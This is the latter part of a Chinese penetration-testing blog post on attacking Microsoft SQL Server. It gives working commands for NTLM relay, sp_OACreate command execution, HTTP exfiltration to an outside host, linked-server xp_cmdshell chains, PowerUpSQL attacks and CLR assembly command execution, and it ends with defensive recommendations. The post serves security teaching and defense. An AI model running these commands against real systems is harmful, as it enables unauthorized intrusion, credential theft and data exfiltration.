+<h3 id="4-3-NTLM中继"><a href="#4-3-NTLM中继" class="headerlink" title="4.3 NTLM中继"></a>4.3 NTLM中继</h3><p>若无法破解哈希，可将其中继到不支持SMB签名的内网主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx -tf targets.txt -smb2support -c <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="五、SP-OACreate-与-OLE-自动化过程"><a href="#五、SP-OACreate-与-OLE-自动化过程" class="headerlink" title="五、SP_OACreate 与 OLE 自动化过程"></a>五、SP_OACreate 与 OLE 自动化过程</h2><p>OLE Automation Procedures 允许通过 <code>sp_OACreate</code> 创建COM对象并调用其方法。默认禁用，需 <code>sysadmin</code> 启用。相比 <code>xp_cmdshell</code>，它能借助任意COM对象实现更多样化的操作。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 启用</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-1-文件操作（Scripting-FileSystemObject）"><a href="#5-1-文件操作（Scripting-FileSystemObject）" class="headerlink" title="5.1 文件操作（Scripting.FileSystemObject）"></a>5.1 文件操作（Scripting.FileSystemObject）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@fso</span> <span class="type">INT</span>, <span class="variable">@file</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;Scripting.FileSystemObject&#x27;</span>, <span class="variable">@fso</span> OUTPUT;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@fso</span>, <span class="string">&#x27;CreateTextFile&#x27;</span>, <span class="variable">@file</span> OUTPUT,</span><br><span class="line">    <span class="string">&#x27;C:\temp\shell.txt&#x27;</span>, <span class="number">2</span>, <span class="number">1</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@file</span>, <span class="string">&#x27;WriteLine&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;Hello from MSSQL&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@file</span>, <span class="string">&#x27;Close&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OADestroy <span class="variable">@fso</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-命令执行（WScript-Shell）"><a href="#5-2-命令执行（WScript-Shell）" class="headerlink" title="5.2 命令执行（WScript.Shell）"></a>5.2 命令执行（WScript.Shell）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@shell</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="variable">@shell</span> OUTPUT;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@shell</span>, <span class="string">&#x27;Run&#x27;</span>, <span class="keyword">NULL</span>,</span><br><span class="line">    <span class="string">&#x27;cmd /c whoami &gt; C:\temp\out.txt&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OADestroy <span class="variable">@shell</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-HTTP外传（MSXML2-ServerXMLHTTP）"><a href="#5-3-HTTP外传（MSXML2-ServerXMLHTTP）" class="headerlink" title="5.3 HTTP外传（MSXML2.ServerXMLHTTP）"></a>5.3 HTTP外传（MSXML2.ServerXMLHTTP）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@http</span> <span class="type">INT</span>, <span class="variable">@result</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;MSXML2.ServerXMLHTTP&#x27;</span>, <span class="variable">@http</span> OUTPUT;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@http</span>, <span class="string">&#x27;open&#x27;</span>, <span class="keyword">NULL</span>,</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://192.168.1.50:8080/exfil?d=from_mssql&#x27;</span>, <span class="number">0</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@http</span>, <span class="string">&#x27;send&#x27;</span>, <span class="variable">@result</span> OUTPUT;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OADestroy <span class="variable">@http</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-WMI横向移动（WbemScripting-SWbemLocator）"><a href="#5-4-WMI横向移动（WbemScripting-SWbemLocator）" class="headerlink" title="5.4 WMI横向移动（WbemScripting.SWbemLocator）"></a>5.4 WMI横向移动（WbemScripting.SWbemLocator）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@obj</span> <span class="type">INT</span>, <span class="variable">@svc</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WbemScripting.SWbemLocator&#x27;</span>, <span class="variable">@obj</span> OUTPUT;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@obj</span>, <span class="string">&#x27;ConnectServer&#x27;</span>, <span class="variable">@svc</span> OUTPUT,</span><br><span class="line">    <span class="string">&#x27;192.168.1.200&#x27;</span>, <span class="string">&#x27;root\cimv2&#x27;</span>, <span class="string">&#x27;DOMAIN\user&#x27;</span>, <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OADestroy <span class="variable">@obj</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、链接服务器（Linked-Server）链式攻击"><a href="#六、链接服务器（Linked-Server）链式攻击" class="headerlink" title="六、链接服务器（Linked Server）链式攻击"></a>六、链接服务器（Linked Server）链式攻击</h2><p>链接服务器允许一个SQL Server实例对远程数据源执行查询。当攻破一台MSSQL后，利用已配置的链接服务器可实现横向移动甚至跨域攻击。</p>
+<h3 id="6-1-信息收集"><a href="#6-1-信息收集" class="headerlink" title="6.1 信息收集"></a>6.1 信息收集</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@SERVERNAME</span>;                        <span class="comment">-- 当前实例名</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_linkedservers;                      <span class="comment">-- 列出链接服务器</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sys.servers <span class="keyword">WHERE</span> is_linked<span class="operator">=</span><span class="number">1</span>; <span class="comment">-- 详细配置</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-在链接服务器上执行命令"><a href="#6-2-在链接服务器上执行命令" class="headerlink" title="6.2 在链接服务器上执行命令"></a>6.2 在链接服务器上执行命令</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- OPENQUERY 方式</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OPENQUERY(&quot;TARGET&quot;,</span><br><span class="line">    <span class="string">&#x27;SELECT @@VERSION&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OPENQUERY(&quot;TARGET&quot;,</span><br><span class="line">    <span class="string">&#x27;EXEC sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;RECONFIGURE;</span></span><br><span class="line"><span class="string">     EXEC xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- EXEC AT 方式（SQL Server 2005+）</span></span><br><span class="line"><span class="keyword">EXEC</span> (<span class="string">&#x27;EXEC sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;RECONFIGURE;&#x27;</span>)</span><br><span class="line">    <span class="keyword">AT</span> &quot;TARGET&quot;;</span><br><span class="line"><span class="keyword">EXEC</span> (<span class="string">&#x27;EXEC xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;</span>) <span class="keyword">AT</span> &quot;TARGET&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-多级链式跳板"><a href="#6-3-多级链式跳板" class="headerlink" title="6.3 多级链式跳板"></a>6.3 多级链式跳板</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- SERVER_A -&gt; SERVER_B -&gt; SERVER_C</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OPENQUERY(&quot;SERVER_A&quot;,</span><br><span class="line">    <span class="string">&#x27;SELECT * FROM OPENQUERY(&quot;SERVER_B&quot;,</span></span><br><span class="line"><span class="string">        &#x27;&#x27;EXEC xp_cmdshell &#x27;&#x27;&#x27;&#x27;whoami&#x27;&#x27;&#x27;&#x27; &#x27;&#x27;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>登录映射（Login Mapping）决定了在远程服务器上的执行身份。”当前安全上下文”模式权限取决于当前用户，固定账户映射则以该账户执行。</p>
+</blockquote>
+<h2 id="七、PowerUpSQL-——-自动化攻击模块"><a href="#七、PowerUpSQL-——-自动化攻击模块" class="headerlink" title="七、PowerUpSQL —— 自动化攻击模块"></a>七、PowerUpSQL —— 自动化攻击模块</h2><p><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a> 是NetSPI开发的MSSQL安全评估PowerShell工具集，集成实例发现、审计、提权和漏洞利用功能。</p>
+<h3 id="7-1-实例发现"><a href="#7-1-实例发现" class="headerlink" title="7.1 实例发现"></a>7.1 实例发现</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> PowerUpSQL.psd1</span><br><span class="line"><span class="built_in">Get-SQLInstanceLocal</span>                             <span class="comment"># 本机实例</span></span><br><span class="line"><span class="built_in">Get-SQLInstanceBroadcast</span>                         <span class="comment"># UDP广播发现</span></span><br><span class="line"><span class="built_in">Get-SQLInstanceDomain</span>                            <span class="comment"># SPN扫描域内实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 审计弱口令和默认凭证</span></span><br><span class="line"><span class="built_in">Invoke-SQLAuditDefaultAccounts</span> <span class="literal">-Instance</span> <span class="string">&quot;192.168.1.100&quot;</span></span><br><span class="line"><span class="built_in">Invoke-SQLAuditWeakLoginPw</span> <span class="literal">-Instance</span> <span class="string">&quot;192.168.1.100&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-自动化利用"><a href="#7-2-自动化利用" class="headerlink" title="7.2 自动化利用"></a>7.2 自动化利用</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># UNC路径哈希窃取（配合Responder）</span></span><br><span class="line"><span class="built_in">Invoke-SQLUncPathInjection</span> <span class="literal">-Instance</span> <span class="string">&quot;192.168.1.100&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动配置xp_cmdshell并执行命令</span></span><br><span class="line"><span class="built_in">Invoke-SQLOSCmd</span> <span class="literal">-Instance</span> <span class="string">&quot;192.168.1.100&quot;</span> <span class="literal">-Command</span> <span class="string">&quot;whoami&quot;</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 审计OLE Automation配置</span></span><br><span class="line"><span class="built_in">Invoke-SQLAuditOleAutomation</span> <span class="literal">-Instance</span> <span class="string">&quot;192.168.1.100&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索敏感列数据</span></span><br><span class="line"><span class="built_in">Get-SQLColumnSampleData</span> <span class="literal">-Instance</span> <span class="string">&quot;192.168.1.100&quot;</span> `</span><br><span class="line">    <span class="literal">-Keywords</span> <span class="string">&quot;password,secret,pass,credit,ssn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爬取所有链接服务器并链式渗透</span></span><br><span class="line"><span class="built_in">Get-SqlServerLinkCrawl</span> <span class="literal">-Instance</span> <span class="string">&quot;SQL01\PROD&quot;</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ADCS中继攻击（ESC8）</span></span><br><span class="line"><span class="built_in">Invoke-SQLADCSReplay</span> <span class="literal">-Instance</span> <span class="string">&quot;192.168.1.100&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="八、CLR程序集提权（简述）"><a href="#八、CLR程序集提权（简述）" class="headerlink" title="八、CLR程序集提权（简述）"></a>八、CLR程序集提权（简述）</h2><p>SQL Server CLR集成允许在数据库中注册并执行.NET程序集。拥有 <code>sysadmin</code> 或 <code>CREATE ASSEMBLY</code> 权限时，可创建CLR存储过程以服务账户权限执行系统命令。当 <code>xp_cmdshell</code> 和OLE Automation均不可用或被严格监控时，CLR成为高级替代方案。</p>
+<p>利用流程：编写C#类库实现命令执行 -&gt; 编译DLL转十六进制字符串 -&gt; <code>CREATE ASSEMBLY</code> 注册 -&gt; 创建CLR存储过程 -&gt; 调用执行。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 注册CLR程序集（HEX DLL）</span></span><br><span class="line"><span class="keyword">CREATE</span> ASSEMBLY [SqlShell] <span class="keyword">AUTHORIZATION</span> [dbo]</span><br><span class="line">    <span class="keyword">FROM</span> <span class="number">0x4D5A90000300000004000000FFFF000</span>... <span class="comment">-- 完整HEX省略</span></span><br><span class="line">    <span class="keyword">WITH</span> PERMISSION_SET <span class="operator">=</span> UNSAFE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 绑定CLR存储过程</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> [dbo].[CmdExec] <span class="variable">@cmd</span> NVARCHAR(MAX)</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">EXTERNAL</span> NAME [SqlShell].[StoredProcedures].[CmdExec];</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行命令</span></span><br><span class="line"><span class="keyword">EXEC</span> CmdExec <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>CLR程序集攻击的完整原理、DLL编写技巧与免杀方案，请参阅：<strong><a href="/MSSQL-CLR-Assembly-Privilege-Escalation/">MSSQL CLR程序集权限提升详解</a></strong>。</p>
+</blockquote>
+<h2 id="九、技术对比总结"><a href="#九、技术对比总结" class="headerlink" title="九、技术对比总结"></a>九、技术对比总结</h2><table>
+<thead>
+<tr>
+<th>技术</th>
+<th>所需权限</th>
+<th>默认状态</th>
+<th>核心攻击价值</th>
+<th>监控关注度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xp_cmdshell</td>
+<td>sysadmin</td>
+<td>禁用</td>
+<td>直接命令执行</td>
+<td>高</td>
+</tr>
+<tr>
+<td>xp_regread&#x2F;write</td>
+<td>sysadmin</td>
+<td>启用</td>
+<td>注册表读写与持久化</td>
+<td>中</td>
+</tr>
+<tr>
+<td>xp_dirtree</td>
+<td>public</td>
+<td>启用</td>
+<td>文件探测 &#x2F; UNC哈希窃取</td>
+<td>低</td>
+</tr>
+<tr>
+<td>SP_OACreate</td>
+<td>sysadmin</td>
+<td>禁用</td>
+<td>COM对象调用 &#x2F; 多态执行</td>
+<td>中高</td>
+</tr>
+<tr>
+<td>Linked Server</td>
+<td>视映射</td>
+<td>视配置</td>
+<td>横向移动 &#x2F; 跨实例攻击</td>
+<td>中</td>
+</tr>
+<tr>
+<td>PowerUpSQL</td>
+<td>有效凭据</td>
+<td>N&#x2F;A</td>
+<td>自动化攻击</td>
+<td>N&#x2F;A</td>
+</tr>
+<tr>
+<td>CLR Assembly</td>
+<td>sysadmin&#x2F;DBA</td>
+<td>视配置</td>
+<td>免杀命令执行 &#x2F; 持久化</td>
+<td>中高</td>
+</tr>
+</tbody></table>
+<h2 id="十、防御建议"><a href="#十、防御建议" class="headerlink" title="十、防御建议"></a>十、防御建议</h2><ol>
+<li><strong>最小权限：</strong> 避免以 <code>LocalSystem</code> 运行MSSQL，改用托管服务账户（gMSA）或低权限域账户。</li>
+<li><strong>关闭危险功能：</strong> 生产环境禁用 <code>xp_cmdshell</code>、<code>Ole Automation Procedures</code>，移除不需要的扩展存储过程。</li>
+<li><strong>网络隔离：</strong> 限制MSSQL主机出站SMB（445端口），阻止UNC哈希外泄；配置防火墙仅允许应用层访问数据库。</li>
+<li><strong>强制SMB签名：</strong> 内网Windows主机启用SMB签名，阻断NTLM中继攻击。</li>
+<li><strong>审计与监控：</strong> 监控对 <code>sp_configure</code>、<code>xp_cmdshell</code>、<code>sp_OACreate</code> 的调用；对链接服务器的异常跨实例查询进行告警。</li>
+<li><strong>补丁管理：</strong> 保持MSSQL与Windows及时更新，修复已知提权漏洞。</li>
+<li><strong>审查链接服务器：</strong> 清理长期未使用的链接服务器配置，移除低信任关系的链接。</li>
+</ol>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>MSSQL的攻击面从系统存储过程到OLE自动化、从链接服务器到CLR运行时，每一条路径都可能成为攻击者横向移动与权限提升的通道。防御者理解这些攻击面是构建纵深防御的前提，渗透测试者熟练掌握这些技术则能在授权评估中更全面地暴露安全风险。建议读者继续学习 <strong><a href="/MSSQL-CLR-Assembly-Privilege-Escalation/">MSSQL CLR程序集权限提升详解</a></strong>，并结合《内网信息收集指南》《NTLM中继攻击实战》《Kerberos票据攻击》等文章构建完整的内网渗透知识体系。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/" rel="tag"># 数据库安全</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Cloud-Tencent-GCP/" rel="prev" title="云安全：腾讯云与GCP安全">
+                  <i class="fa fa-angle-left"></i> 云安全：腾讯云与GCP安全
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/LFI-log-poisoning-session/" rel="next" title="文件包含漏洞：日志注入与Session包含">
+                  文件包含漏洞：日志注入与Session包含 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
